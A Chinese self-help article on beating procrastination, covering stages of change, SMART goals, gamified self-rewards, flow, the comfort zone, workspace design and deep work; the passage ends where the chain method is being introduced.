将改变习惯的过程分成四个阶段： 前关注：在这个阶段，你还没有想要改变。 关注：你意识到问题的存在，并思考采取行动作出改变，但内心可能会有纠结或者激烈的争执。 准备：在这个阶段，你尝试了一些行动，但并没有完全投入，愿意试试看。 行动：这个阶段意味着真正开始采取行动。 如果你对拖延症只有模糊的概念，那么你处于前关注阶段；如果你已经意识到自己需要改变，那么你已经进入了关注阶段。 需要注意的是，准备阶段并不代表没有行动。事实上，准备阶段的行动更为重要，因为只有通过这个阶段，你才能下定决心改变。同时，这个阶段也是你最容易反复的时候，需要不断尝试、受挫、最终坚定地去行动。 如果你曾经经历过一些失败的改变，比如早睡、不发脾气、养成健身习惯等，那么你的放弃通常都发生在准备阶段。 黄金平衡点 当提到「计划」这个词时，你是否不禁叹了口气？我知道很多人制定的计划，不管是备考学习还是锻炼健身，从未成功执行过，因此索性不再制定计划。 那么，为什么那些计划没有完成呢？如何制定一个能够帮助你摆脱「拖延症」的计划呢？ 这张折线图的横轴有两个要素：一个是「任务难度」，从容易到困难；另一个是完成任务的「乐观程度」，任务越简单，对任务的完成就越乐观。 纵轴表示完成任务的积极性。当任务特别简单时，纵轴上的积极性很低。随着任务难度的增加，积极性逐渐提高，但在达到某个最高点后开始下降。 这是因为任务太容易会变得乏味，甚至机械重复，没有人想做这样的任务。因此，最初的任务最简单，做事的积极性最低。随着任务难度的增加，做事的积极性开始上升，达到最高点时，我们有最大的动力去完成任务。然而，积极性不会一直上升，当任务难度超过你能接受的范围时，你会觉得任务太难，不可能完成，或者时间太紧迫，无法实现，这时做事的积极性会急剧下降，直至为零。 说到这里，你可能已经意识到，不好的计划，也就是容易导致拖延的计划，出现在你失去做事积极性的两种情况下： 一种是低估自己的能力，计划没有挑战性，自然就没有兴趣； 另一种是高估自己，要么给自己的任务太难，要么像「龟兔赛跑」中的兔子一样，因为觉得胜券在握，而迟迟不采取行动，结果直到截止日期临近，才突然发现完成任务的难度和所需时间远远超出想象，于是只能在极度恐慌和焦虑中匆忙应付。 而好的计划应该将任务难度控制在合适的范围内，就是通过过去的经验让你相信自己可以完成任务，但同时你也需要付出很多努力，而且成功的奖励近在咫尺。在这种情况下，你会感到如沐春风，毫不犹豫地向前迈进。 只有这样，执行任务的积极性和乐观程度才能达到平衡，达到图中的最高点，也就是我们所说的黄金平衡点。 下面提供了一个表格，仅供参考，用来调整计划的事情和行动起来的积极性，找到平衡点。 记录拖延行为 今天我们将介绍一个非常实用的技巧，即如何记录你的拖延行为。在接下来的训练营中，你将需要每天记录下自己的行为，以帮助你识别和纠正自己的拖延行为。 你可能会发现，有时你会因为在开始做一件事情之前去做一些琐碎的事情而拖延，比如查看工作邮件，结果打开手机就开始刷朋友圈，这样会耽误你完成事情的时间。因此，记录自己的行为非常重要，因为这样可以帮助你意识到自己都做了哪些事情，哪些是有必要的，哪些是没必要的。在记录自己的行为时，你需要注意以下三个方面： 第一，要分清哪些是拖延行为，哪些是正常休息。正常休息可以让你更好地工作，但如果是拖延行为，你需要将其记录下来。最简单的方法是看你做这件事是否对你的工作状态进行必要的调整，以及这件事是否与你的工作任务直接相关或必要。 第二，要记住你的拖延征兆，一旦出现苗头就要及时制止。心理学研究表明，有一些人在拖延时会出现生理反应，这是一种常见的拖延征兆。如果你知道自己的拖延征兆，就可以更容易地发现自己正在拖延，并采取措施制止它。 第三，要记录你的拖延借口，不要害怕揭穿自己。你需要识别你的借口，并试图克服它们。例如，你可能会觉得自己需要先泡杯茶才能开始工作，或者需要先和朋友聊聊天才能开始工作。这些都是拖延的借口，你需要记录下来，并设法克服它们。 为了将这些拖延行为真正从你的生活中剔除，你可以在手边备个本子，或者使用手机上的备忘录，将自己在做正事之前所做的所有事情一一记录下来。通过记录和分析自己的行为，你可以逐步克服拖延，变得更加高效和自律。 SMART 任务管理 任务管理 很多人因为任务管理问题而拖延、效率低下，容易半途而废。下面我会通过两个例子来说明如何进行任务管理。 第一个例子，一个同事发誓要重构整个项目，说：“不重构完代码不休息！”一般情况下，你很难看到他真的开始重构。他觉得程序的代码质量不够好，决定要换一种编程语言重构，因为听说代码质量差会导致项目崩溃。但是他坚持了多久呢？他给自己两个月的时间，拖了两天，开始了四天的重构工作，然后犒劳一下辛苦工作的自己休息了一天，接着就进入了漫长的调试期、拖延期，然后再开始，直到最后放弃。 第二个例子，我的朋友燕子是一个幼教课的课程销售，是个新手。公司针对双十一推出课程的优惠活动，她的目标是在一周内拉新 100 人。她提前一个月就开始准备，但是越准备越发现这件事难，她开始还积极地想了一些办法，后来干脆就放弃了。于是在老板看来，燕子这一个月的工作是停滞不前的，等到拉新那周的到来，最后报名的新客户只有3人。 这两个例子有三个共同特点： 任务目标过于困难，对于当事人几乎不可执行。无论是两个月瘦三十斤，还是让一个销售新手一周拉新100人； 执行过程中，整个任务安排和进度管理是失控的，最后只能任其发展。自然是拖延、低效、没结果； 如果当事人希望下次能够成功的话，需要一次有针对性的复盘。 那如何进行任务管理才能不拖延、不放弃，最终能完成好呢？通过刚才对上面失败例子的拆解，我们可以看到，完整的任务管理流程可以分为三个部分：计划、执行和复盘反馈。也就是说，完成任务是一个整体的过程。 一个好的任务管理需要进行计划、执行和复盘反馈三个步骤。在计划阶段，需要对目标和任务进行拆解和规划，制定可行的执行方案；在执行阶段，需要对进度和时间进行把控，确保任务的执行进度可控；最后在复盘反馈阶段，需要对任务的每一个结点进行验收评估，及时纠偏并制定执行标准，确保任务完成的质量符合要求。 拆解任务、做计划 SMART 原则是一个重要的任务管理工具，它可以帮助我们拆解任务目标、做计划。使用 SMART 原则，我们可以将任务目标具体化、可衡量、可操作、相关和有时间限制。这个方法源自于美国马里兰大学管理及心理学教授洛克，S-M-A-R-T分别代表五个英文单词的首字母。下面我将对每个字母进行详细解释。 Specific（具体的）：在任务管理的第一步中，我们需要拆解任务目标、制定计划。在这个过程中，我们必须确保拆分出来的小目标是具体的，避免出现模糊的情况。例如，如果我们的任务目标是“两个月瘦30斤”，我们需要将其分解为每个阶段要减多少斤、如何分配时间等具体的小目标。 Measurable（可衡量的）：可衡量的目标是指可以用确切数字来衡量的标准，这样就可以避免标准上的争议。对于“两个月瘦30斤”这个任务，我们需要将其细化为“每天跑步20分钟”、“不吃高热量食物，每周有一天例外”等可衡量的小目标。 Attainable（可操作的）：可操作的目标是指能够在实际操作中实现的目标，需要考虑自身的条件和实际情况。如果我们的目标过于理想化，而无法在实际操作中实现，这个目标就是不可操作的。因此，在制定计划时，我们需要确保目标是可操作的，以便在实际操作中实现。 Relevant（相关的）：相关的目标是指与我们的最终目标相关的目标。例如，如果我们的最终目标是健康减肥，那么我们的小目标就应该包括饮食、运动、睡眠等方面，而不仅仅是单纯的减肥。这样可以确保我们的小目标与最终目标是相互关联的，达到整体提升的效果。 Time-bound（有时间限制的）：有时间限制的目标是指在一定时间内完成的目标，这可以帮助我们避免无限拖延。在制定计划时，我们需要确保每个小目标都有明确的时间期限，以便我们可以及时跟进并达成目标。 使用 SMART 原则来拆解任务、做计划，可以帮助你制定出具体、可衡量、可操作、相关、有时间期限的小目标，这样你可以更容易地实现大目标。同时，在任务执行的过程中，你可以用这些标准来评估自己的进展，以便及时调整你的计划，保证最终的目标能够顺利达成。 举个例子 SMART 原则拆分任务，帮助我优化程序代码 我之前的写的程序代码中存在一些性能问题，需要进行优化。我的目标是在两周内提高程序 30% 的运行速度。根据 SMART 原则，我将任务拆分成几个具体的子任务，以便更好地执行。 首先，我需要分析现有的代码，找到不必要的、重复的和冗余的部分。这是一个明确的任务，可以进行具体的度量和评估，也是整个优化过程的核心。 其次，我需要学习新的编程技巧和工具，以提高效率和代码质量。这可以通过阅读文档、查看教程、参加培训等方式来实现。 还需要进行代码重构，将不必要的代码删除或优化，使代码更简洁、易于维护和阅读。 最后，我需要在每个阶段设定具体的目标和时间表，并进行跟踪和反馈。这有助于确保整个优化过程按计划进行，及时发现和解决问题。 在 SMART 原则的指导下，我成功地优化了我的程序，比原先的性能提高了 30%。这个过程并没有花费我太多的精力和意志力，而是通过合理拆分任务，制定明确的计划，并逐步实施，达成了目标。 让我们来回顾一下 SMART 原则的五个要素：任务目标必须具体、可衡量、可实施、相关性强、时间限制明确。 在任务管理的流程中，我们已经了解了如何用 SMART 原则来拆分任务和制定计划。然而，在实际执行中，有时候我们可能会遇到一些之前没有预料到的问题，导致结果不尽如人意。这时候，我们需要在每个任务结点之后进行复盘反馈。可以多问问自己以下问题：「我做了什么？」、「是否达到预期目标？」、「举例目标还有多远？」、「什么完成或未完成任务？」、「遇到什么棘手的问题？」、「这个问题我能独立解决吗？」、「如果无法独立解决，应该找谁解决？」、「接下来我要怎么做」。 如果能够进行这样的复盘，那么你已经做得非常出色了。但是，这样的复盘往往没有纠正和执行的标准，而 SMART 原则提供了一套标准化的衡量方式。那么，如何使用 SMART 原则及时评估、调整和修正任务呢？根据 S-M-A-R-T（具体、可衡量、可操作、相关性、时间限制）这五个标准，可以从以下五个方面进行考量： 任务目标是否过于模糊，让人难以实施。 任务目标是否无法量化，让人难以看到效果。 任务目标是否过于远大，让人望而生畏。 根据大目标设定的计划，或在执行计划时是否偏离了目标。 每项任务是否设定了合理的期限，以激励自己在规定的时间内按时完成任务。 下面是通过 SMART 原则拆分任务的一个示例。 成功螺旋法 自信即动力 Piers Steel 指出，如果你能给自己设定一系列可达成的挑战目标，你就会充满动力。这是因为每当你完成一个小目标时，你就会获得一定的自信，而增长的自信会带领你向更高的目标迈进。 同时，当你在某个领域取得成功时，你也会更有信心去挑战其他领域，并且更容易成功。因此，建议你设定一些小目标并逐步完成它们，这将帮助你增强自信并激发前进的动力。 需要注意的是，这里有两个关键点。第一，你需要设置可达到的、阶梯上升的小目标，并不断去实现它们，以达到成功螺旋的效应。第二，一旦你在某个领域取得了小成功，你在这个领域建立起的自信和成功感，就可以被迁移到其他你需要的地方。这也就是为什么成功人士通常在多个领域都取得成功的原因。 制定小目标 这个方法的第一个特点是给自己设置可达到的、阶梯上升的小目标，并且共有四个步骤： 设置一个足够小的起始目标。 每次比原计划超额完成一点点。 给自己一点回报。 当你觉得自己已经养成习惯，或者对这项任务已经很熟练的时候，给自己设置下一个有挑战的目标。 这个方法的第二个特点是游戏化，即将每个任务都碎成粉末，每一粒粉末都非常容易达成。在生活和工作中，你可以将大任务拆成小块，使其容易完成，从而降低自己对任务的恐惧感，同时也能让自己不断体验到完成任务的成就感，进而追求更难的任务。 举个例子，如果你计划早上吃早餐、健身，但是已经习惯了睡到卡点上班，你可以将任务分解为早上做一个俯卧撑。如果你的目标是阅读一本书，但已经很久没有打开一本书，你可以将目标细分为每天读一定的页数，从而让自己逐步养成习惯。此外，不要忘记为自己的努力给予奖励，这可以提高自我激励，并有助于巩固习惯。 奖赏机制 游戏化思维 为什么游戏能够让你上瘾？Kevin Werbach 是《游戏化思维》的作者，他认为，大多数人类活动，比如参加考试、学习技能、从事商业活动等本身就是游戏。你需要花时间和精力去练习、提升等级、克服困难，才能变强、成为高手。然而，为什么人们对工作和学习任务不感兴趣，却容易沉迷于电脑游戏？这是因为后者的设计很好。 在游戏设计中，有三个要素很重要：目标设计、反馈和奖赏机制、心流体验。虽然游戏的终极目标只有最后一个，但是它会通过拆分终极目标，变成一个个容易上手、阶梯上升的「粉末任务」让你不断去完成，也就是我们说的「升级打怪」。如果在工作和学习中运用相同的策略，你也可以给自己设置不断进阶的「粉末任务」。 第二个重要要素是反馈和奖赏机制，也是今天的重点。游戏之所以能让你欲罢不能，是因为其中的奖赏机制能够促使你产生多巴胺动机。多巴胺是一种能让我们快乐的激素。但如果你把整个游戏化的过程理解为获得奖赏-产生多巴胺-感到快乐，那你就错了。心理学家发现，多巴胺的产生并不是在你得到奖励的时刻，也不是在得到奖励之后，而是在获得奖励之前就会产生了。 事实上，我们的大脑在有可能获利的时候，受到的刺激比最后获得奖赏的时候还要强烈。相信你有过这样的体验，你并不是因为游戏让你百爪挠心不能专心工作，而是你想玩游戏的念头让你不想坐在书桌前。 如果想要真正通过游戏化来进行正向的自我激励，就需要在工作和学习中运用这些游戏设计的因素，并且设计出能够在过程中激发人们动力的奖赏机制。这需要我们注意到多巴胺的产生与奖赏的时机有关，需要在任务完成之前就能够激发人们的动力，而不是等到任务完成后才给予奖励。 建立多巴胺动机 想要建立多巴胺动机，有两个重要因素：第一是预期奖励，也就是提前设定好奖励，让你有期待；第二是强化奖励程序，也就是让你在最希望获得奖励的时候得到这些奖励。 为什么会想要在游戏内完成极其艰难的任务或者氪金呢？因为你知道有宝贵的奖励在等待，这些提前设置好的奖励都是为了提升你去做的动力。现在每个大型游戏都有自己的官网，详细介绍游戏中的职业、技能、稀有物品、成就称号等等，以及极具挑战性的怪物掉落的极品装备，这些介绍都是为了设置奖励预期。 强化奖励程序也很重要，因为要让玩家知道什么行为能得到他们所期望的奖励，玩家才会做出游戏设计者希望他们做出的行为。游戏可以在玩家完成任务、氪金、连续登陆、掉落重要物品等等时刻发放奖励，有的游戏甚至会在每次掉落重要物品的时候，提示你距离掉落另一个宝箱或者距离角色升级这些奖励出现的时刻只剩下几分钟了。在这样的奖励程序设置下，你会乐此不疲地追逐下一个几分钟之后的奖赏，玩得上瘾。 在游戏中，我们通过奖励程序让玩家上瘾，同样的，在工作生活中，我们也可以运用奖励预期和强化程序这两个方面来让你有动力。 首先，你可以给自己设定一个奖励清单，里面包含你想要的奖励，不一定都与钱有关，也可以是你想做但又觉得在工作中不该做的事情。通过提前设定好这些奖励，就像在游戏中提前设定好掉落的装备一样，可以让你产生多巴胺动机。并且，这些奖励在后续的工作中也能继续发挥正向的作用，因为在接受工作带来的奖励时，你会不知不觉地把奖励和努力工作的行动联系起来，从而成为一种奖励。 这个过程叫做「习得性勤奋」，也就是说，你可以通过多次的「努力 - 回报 - 努力」这样的周期来培养对工作的兴趣，慢慢地爱上你的工作。 其次，我们还需要注意到奖励的程序，也就是如何奖励。在游戏中，玩家完成副本任务后会得到升级和装备的奖励，攻击对方一下就会显示掉一格血，这些都是即时反馈。但在工作学习中，需要很长时间才能知道结果，比如工作绩效和考试成绩。因此，我们需要在工作中给自己制造快速反馈，比如依照提前设置好的奖励预期，在完成一项任务之后就及时奖励自己；或者为自己的工作设置一个进度表，时刻让自己看到进度条，都是非常有效的。 总之，通过游戏化的方式，我们可以在工作生活中让自己更有动力，解决拖延症。记得给自己设置奖励预期，并为自己的工作设置一个即时反馈的强化程序，让自己在工作中保持动力和积极性。 给予恰当地奖励 我们刚刚提到了即时反馈，现在让我们来谈谈如何恰当地奖励自己。游戏化奖赏中的“强化程序”在工作中的运用有一个非常重要的注意点，那就是要合理匹配任务和奖励。这意味着你得到的奖励应该与你为完成任务所付出的努力成比例。 如果奖励太少，那么就无法激励自己；如果奖励太多，而你完成的任务又太少，那么你的初衷就会被打破。举个例子，如果你用两个星期的时间完成了一个项目，但是只奖励自己刷五分钟推特，那么这个奖励就没有起到任何激励作用。另一方面，如果你答应自己看五页书就可以追五集电视剧，那么很可能你会在两天内追完整部剧集，而书却只看了几页。 为了避免奖励和任务不成比例，我们可以使用一些小技巧，就是用不同的方式衡量任务和奖励。 对于任务，我们应该用完成的数量来衡量，比如看了多少页书或减少了多少厘米腰围；而对于奖励，我们应该用花在这件事情上的时间来衡量，比如看了几分钟的剧或者打了多长时间的游戏。例如，你可以这样跟自己说： 我只有把这两件衣服洗干净才能刷五分钟推特。 我看完了30页书，就可以获得半个小时看电视剧的时间。 我写完论文的讨论就可以出门逛一圈，买一杯咖啡等等。 这样做是为了防止你欺骗自己，因为如果反过来用时间来确定任务，而用数量来确定奖励，很可能会出现在完成任务时磨蹭拖延，浪费时间而没有完成工作，而在享受奖励时，可能会一直玩游戏，却没有限制时间。 跳出舒适圈 什么是心流 工作和学习这些需要完成的任务，往往会让你感到不舒服，因为它们的难度可能过于简单或者过于困难，这会让你感到无聊或者焦虑。相反，游戏可以通过调整难度，让你面临的任务不会太简单或太困难，从而让你很容易进入全神贯注的状态，也就是所谓的“心流”状态。 心流是由 Mihaly Csikszentmihalyi 提出的一个概念。在心流状态下，你可以全神贯注地投入某项活动中，甚至忘记时间和自我存在的感觉。研究表明，成人在工作中更容易出现心流状态，而不是在娱乐中。这是因为工作也可以像游戏一样，有目标、规则、反馈和奖赏。所以，你可以调整工作状态，让任务难度与你的能力相匹配，并集中精力应对，从而进入心流状态。 如果你想要提高生活体验，避免拖延症所带来的焦虑，你需要关注你的工作体验。毕竟，我们每天清醒的时间有一半以上都会用在工作上，因此，让工作变得有趣和充满挑战性，是非常重要的。 如果你想在工作中达到心流状态，那么你需要调节任务的难度，让自己不会感到焦虑或无聊，这样你就能够专注于当前的工作，享受这个过程所带来的乐趣。 调节任务的难度可以通过给自己设定小目标，并不断进阶来实现。对于任务过于简单的情况，你需要增加难度，走出舒适区。有些人在工作中只重复做一些基础工作，甚至像接电话、传文件、复印、扫描、发快递这种职场新人式的工作也交给他们来完成。这样的人通常会拖延或磨蹭，缺乏对工作的热情。相反，那些敢于面对挑战、工作效率高、热情高的人则会获得更多的机会。 人的能力圈和对世界的认知可以分为三个区域：舒适区、学习区和恐慌区。舒适区是指你对这个范围内的人和事都非常熟悉，有把握保持稳定的表现。待在舒适区，你会感到放松，但长期在舒适区只有重复没有挑战。学习区是指对你来说有一定挑战，因此会感到有些不适，但不至于太难受。恐慌区是指超出你能力范围太多的知识或任务，你会感到严重焦虑、恐惧，甚至可能崩溃、放弃。舒适区外的学习区，是可以让你成长的地方，而恐慌区则是需要避免的地方。 一个人的最理想状态并不是舒适区内安逸自在，也不是在恐慌区内因为负面情绪而被迫不得已地奔跑。相反，最理想的状态应该是处于舒适区和学习区的交界处。在这里，你可以保持积极的态度，但也会有轻微的焦虑感。这种状态可以不断地学习和适应新的有挑战性的事物。 走出舒适圈 第一步，需要对那些一直拖延未完成的任务进行评估，以及这些任务与个人能力之间的关系进行分析。 许多人陷入了舒适区的困境，往往对那些可以轻松胜任的任务产生了拖延情绪。这是因为他们觉得任务太无聊，对其价值感低，并且信心十足地认为可以随时完成。但是，实际工作中有许多不确定性，因此时间管理非常重要。在这种情况下，我们应该给工作赋予更高的价值感，并意识到任务完成的不确定性。这样一来，我们就可以更好地安排时间，避免小事拖延和出错。 另一方面，恐慌区的拖延源于对自己的期望过低，以及对工作的过程和结果充满了怀疑和焦虑，导致不敢行动。在这种情况下，我们需要搞清楚我们恐慌的原因，这样就可以避免被负面情绪所影响。通常，我们害怕的工作都比较复杂，因此我们应该将任务分解为可管理的部分，先完成我们擅长的部分，然后再解决我们害怕的部分。这样，我们就可以逐步地克服恐慌情绪，完成工作。 第二步是针对舒适区中的工作，尝试增加其难度，让其进入“学习区”和“舒适区”的边缘。比如，我们可以压缩时间，提高质量标准，或者在吵闹的环境中工作，以考验自己的注意力集中能力。这些小挑战对每个人来说都不一样，但可以帮助我们逐步扩大我们的舒适区，并促进我们的个人成长。 第三步是设置趋近型目标，将有挑战的任务表述成我们想要达到的成就，而不是简单地描述任务本身。这样做可以强化我们的动机，让我们更有信心和动力去完成任务。在逐渐完成小挑战的过程中，我们可以不断提高自己的自信心和实际能力，从而更好地突破舒适区。 改善焦虑情绪 了解焦虑情绪的来源 焦虑情绪是我们日常生活中经常面对的一种情绪状态。如果我们能够识别并理解焦虑情绪的来源，就能更好地控制它并将注意力集中到需要完成的任务上。我们可以通过反思自己的感受，找出触发我们焦虑情绪的具体事件或想法。有时候，我们会夸大焦虑情绪的影响，而这种放大的效果可能会让我们的焦虑更加严重。因此，当我们能够识别到这种不合理的情绪放大，就能够更容易地打破它，回归正常的思考和做事状态。 正确休息 休息对于解决拖延症也是非常重要的。然而，很多人对休息有一些误解，认为休息就必须做一些特别有意义或有趣的事情。事实上，只要是能让我们放松、愉悦的事情，都可以是休息。不同人有不同的放松方式，例如发呆、散步、看书或者做自己喜欢的事情。此外，在计划的放松时间内，如果我们仍然感到焦虑或者不愿意放松，不妨让自己去完成一些工作或者任务。有时候，强迫自己放松反而会让我们更加焦虑和不安。因此，允许自己不放松，也是一种放松的方式。 奖励自己 奖励自己是一种激励自己完成任务的方式。然而，很多人在奖励自己时会出现困难，因为他们不知道自己真正想要的是什么。因此，首先要找到自己的感兴趣，明确自己真正想要的事情、物品、人是什么。当我们找到了自己真正想要的东西，我们会更有动力去完成任务，并更有可能获得成功。奖励的形式可以多样化，只要是对于我们来说有意义且有吸引力的，就可以成为我们的奖励。随着我们成长和变化，奖励的形式也会发生改变。 营造工作环境 提高专注力 让我们一起回忆一下一个场景，想象你在大学的课堂上。一个夏天的午后，外面的知了不停地叫着，你坐在教室里，看着头顶上的电风扇快速旋转，感到有些无聊。你开始回想昨天晚上看的电视节目，思考同桌今天是否穿了新衣服，甚至开始想妈妈今晚准备做什么菜……突然，你的数学老师用她手中的尺子敲了敲黑板，高声大喊：”认真听课！” 你仿佛被电击了一下，全身一下子变得警觉起来，注意力瞬间被拉回到了教室中。你立刻重新专心地听老师讲解那些课题。 这个例子典型地展示了注意力从分散到集中的过程。 想要了解如何提高注意力的集中程度，首先我们需要了解什么是注意力。根据心理学研究，注意力主要由两个要素构成： 第一个要素是注意的对象，也就是你所关注的事物。第二个要素是你的心理活动如何指向和集中于这个对象。 在上面的例子中，当数学老师怒吼一声时，你的关注点从电风扇、知了的叫声，以及其他无关的事物上移开，转而集中在老师正在讲解的数学题上。这时，数学题和老师成为你的注意对象；同时，老师的怒吼也引导你的思绪和心理活动从电风扇、知了转移到了老师和数学题上，这就是第二个要素——心理活动的指向和集中。 通过以上分析，你可以发现，首先注意力是可以被控制的。通过老师的督促，你的注意力重新回到了学习上。同样地，在工作和生活中，你也可以学会调动注意力，将其集中在重要的任务上。 其次，老师通过一声&quot;请集中注意听讲&quot;，提示你的注意对象是数学题，心理活动应该集中在黑板上。于是，你游离的注意力立刻回到了正轨。那么在平常的工作和生活中，你是否也可以运用一些技巧来增强和提醒自己，明确当前的注意对象以及将心理活动集中在何处呢？ 提升注意力 创造适合工作的环境。 通过&quot;仪式感&quot;强化你的行为。 我们都知道磁铁可以产生磁场，当铁屑或小图钉靠近磁铁时，会受到磁场的吸引力，磁场越强大，吸引力就越强。 Kurt Lewin 提出了“场动力”理论，认为每个人都身处于自己的&quot;心理场&quot;之中。简单来说，就是人们在特定的空间环境中会受到各种因素的影响，这些因素会对我们的心理和行为产生作用。 或许这听起来有些奇怪，但事实上，你所处的环境中包含了一些你没有意识到的行为线索，而这些线索会激发你在这个环境中做出特定的行为。 让我举几个简单的例子，你很快就能理解周围的环境对你行为的影响： 当你身处嘈杂的网吧时，你会想做什么？当然是打游戏。 走进安静的办公室或图书馆，你会有什么想法？工作或学习。 当你来到温暖舒适的卧室，你会想做什么？当然是睡觉。 这些答案几乎会立即闪现在你的脑海中，因为这些地方中的行为线索对你来说是自然而然的。 原因在于，网吧里闪烁的游戏画面、办公室里忙碌工作的同事、图书馆中充满书本的氛围以及卧室中的床，都是这些环境中潜在的行为线索。在这样的线索和刺激下，你更容易做出与该环境相符的行为。 相反地，如果你在嘈杂的网吧里想睡觉，在忙碌的办公室里玩游戏，在温暖的卧室中学习...你会感到非常不舒服，无法集中注意力。这就是不同环境对你行为的影响。 在我们日常的生活和工作中，如何利用环境的力量来有效集中注意力呢？简单来说，就是主动创造一个有利于完成任务的环境，并利用环境的力量来推动我们完成任务。在这里，为了更好地理解，我们可以给环境一个更具体的定义，即「空间的功能分区」。 也许你有过这样的经历：下班后总想学点东西，但一旦吃完饭，你就蜷缩在沙发或卧室里，看着剧集或刷着手机，时间悄悄溜走，转眼已经很晚了。你感到后悔，但好像无法摆脱这个困境。 这是因为你的大脑将沙发和卧室视为休息和娱乐的地方。在休息的「功能区」里努力工作，显然会事倍功半。 你可以对自己的住宅进行合理规划。无论房子的大小，你都可以将其划分为不同的功能区域：比如将卧室仅用于休息和睡眠，尽量使用柔和的光线；客厅用于会客和放松；如果需要在家学习或工作，可以设置一个工作区或阅读角，将书桌、电脑等办公用品放在至少看不见床的地方，并配置明亮的台灯或白炽灯，以激励自己保持专注。 在进行这样的调整后，你可以在工作区域工作，在休息区域休息。这样特定环境的环境能够帮助你的大脑自动切换模式，快速进入所需的状态。相信不久之后，你会发现不仅工作不再拖延，效率也会提高，同时睡眠质量也会得到改善。 此外，如果你觉得在家里仍然存在太多诱惑，你可以继续切换环境，例如图书馆或有办公氛围的咖啡厅。这是因为一个影响环境的重要因素就是人的行为。当周围有更多的人，而且这些人都在进行相似的行为时，环境的力量也会更加强大。 当你看到周围的人都专注地工作时，你自然也会更加努力地投入工作。这就是为什么许多人说高中三年是他们最努力的时光，因为在那段时间里，教室成为了一个强大的学习环境，每个人都专心致志地学习。 节约注意力 相同天赋、结果不同 相同天赋的小明和小红，却走向了不同的结局。让我先讲一个小故事来说明这个问题。在我上学时期，有两个非常聪明的好朋友，他们分别是小明和小红。他们考入中学时一个排名第一，一个排名第二。由于他们在各个方面都表现出色，自然而然地得到了许多机会。 小明参加了各种活动，他参加了数学竞赛、物理竞赛、化学竞赛，甚至还主持了节目。你可能会看到他站在台上，然后又听说他去参加围棋比赛了。相比之下，小红则低调得多。她对数学特别感兴趣，专心致志地参加数学竞赛，将其他活动都搁置了一边。 高中毕业后，小红通过数学竞赛进入了国家队，并被保送到了清华大学。而小明由于各项竞赛成绩一般，没有获得保送资格，高考成绩也失常了，只能进入一所普通的大学。 事实上，小明看似参加了很多比赛，非常光鲜。然而，他实际上拖延做数学竞赛的训练题，总是找借口说自己正忙于物理竞赛；在物理竞赛训练时，他也经常请假，说自己正好有围棋比赛要参加。结果是，他没有把重要的事情做好。 如今已经过去了将近十年，小红依然坚持着自己的目标。她专心致志地从事学术研究，获得了美国最好的计算机学院的博士学位，多家世界顶级企业争相聘请她。 而小明却不知道自己想要什么，他花费了大量精力参加各种活动，频繁换工作，却一直没有取得成果。渐渐地，他在人们中间黯然失色。 为什么同样天赋的小明和小红走向了不同的结局呢？Daniel Kahneman 的注意资源理论给出了一个很好的解释。 他在他的著作《思考，快与慢》中提出了一个观点：人的注意资源是有限的。注意力具有指向性和集中性，调动注意力会消耗我们的生理和心理能量。 因此，在日常工作和生活中，我们对注意力的分配可以看作是对一种有限资源和能量的分配。任务越多、越复杂，耗费的注意资源就越多；任务越简单，耗费的注意资源也就越少。 为了更好地理解这个概念，我给你举个例子：我们的大脑就像一部手机，而注意资源就相当于手机的内存，各种需要解决的任务就像手机上的各种应用程序。如果手机同时开启了太多的应用程序，手机就会变慢甚至死机。同样地，当我们的大脑同时关注过多的任务时，注意资源就会不够用，大脑也会变慢、出现瓶颈。 这就解释了为什么当你正在着急开发一个项目，而经理突然催你去找文件，同事发来消息询问中午要点什么外卖，小孩的班主任又打来电话让你下午去一趟时，你会感到计划一乱团、头痛欲裂的情况。因为这些任务在争夺你的注意资源，而注意资源一旦分散，你自然就容易失去重点和应该做的事情。当你忙于处理那些并不重要的任务时，本应专注完成的重要任务自然会被拖延。 回到之前我与你分享的例子，你可以明显看出：小明是那种同时开了太多应用程序的人，分散了注意资源，重要且应该完成的事情一拖再拖，结果就是什么都没做成。 清理多余信息 在高效利用注意力资源方面，我们需要合理管理自己的注意力，减少不必要的任务，并保留对最重要任务的专注。这种策略被Cal Newport称为&quot;深度工作&quot;，即能够在某些领域中排除干扰，专注于任务的状态。深度工作通常有两种典型模式：禁欲主义模式和节奏模式。接下来，我会详细解释这两种模式。 禁欲主义模式 首先，我们来谈谈禁欲主义模式。禁欲主义模式采取了较为极端的方式，即屏蔽一切可能的干扰信息，只专注于与目标相关的任务。当你的生活中只剩下极少的几项任务时，你就能够更好地深入专研目标。 如果你有一项非常重要的短期目标，比如渴望通过一次技术认证考试。在这种情况下，你可以为自己设定一个为期两个月的&quot;禁欲主义模式&quot;，全身心地投入其中。相比于犹豫、拖延，并告诉自己没有时间而错失机会，采取禁欲主义模式能够取得更好的效果。 就以我的一个朋友为例子来说，他就采用了“禁欲主义模式”。他报名参加了一个专业的培训课进行学习，取消了其它的社交活动，生活除了上课、吃饭和睡觉，目标是计划拿到大厂的 offer。 经过三个月左右的学习，他的技术和能力和之前相比有大幅增长，后来凭着优异的能力获得了理想的公司的职位。 这个例子充分展示了减少不必要任务、集中注意力资源的威力。 节奏模式 我们常常需要找到深度工作和日常琐碎任务之间的平衡，这就是节奏模式的概念。在现实生活中，我们往往无法完全掌控时间，会受到各种突发事件和琐事的干扰，这时候就需要采取节奏模式来应对。 节奏模式包含两个重要方面。首先，我们需要在每天的日程计划中精确安排时间，尽可能创造连续的时间块，专注于重要任务，同时排除外界的干扰。这意味着我们要在工作中划定出专注的时间段，将其他琐事暂时放在一边。 其次，如果我们有一个长期的目标或计划，比如学习英语或写文章，我们需要激励自己每天保持一定时间的深度工作习惯，不断积累在核心任务上的时间。 为了更好地利用工作时间，我建议你充分利用上班时间的8小时。许多人晚上加班的原因之一是白天没有有效利用连续的时间块，而是被许多琐碎的任务所打断。例如，回复同事的紧急求助、处理突然而至的工作邮件以及无休止的社交媒体浏览。 你有没有想过自己每天在回复消息和浏览社交软件上花费了多少时间？有一项调查显示，这些碎片化的时间加起来可能达到 3-4 小时。你可以尝试查看一下自己手机中各个应用程序的使用时长，这可能会让你大吃一惊。 除了监控手机软件的使用情况之外，我还要分享一个方法，关闭软件的推送通知。当你需要进行专注工作时，只打开与工作相关的软件界面，完成任务。你可以设定一个小时的时间限制，工作结束后再集中回复社交软件、邮件等信息。 不断弹出的通知信息只会占用和浪费你的注意力。如果你想要高效完成任务并克服拖延，你需要学会放弃这些干扰。你会发现，在这些琐事中，真正重要的信息数量并不值得你浪费大量时间和注意力资源。 链条法 除了在相对整块的时间里排除干扰只做一件事，对于节奏模式的第二个方面，即如何在较长时间内持续激励自己并平衡注意力分配，我推荐你使用「链条法」。 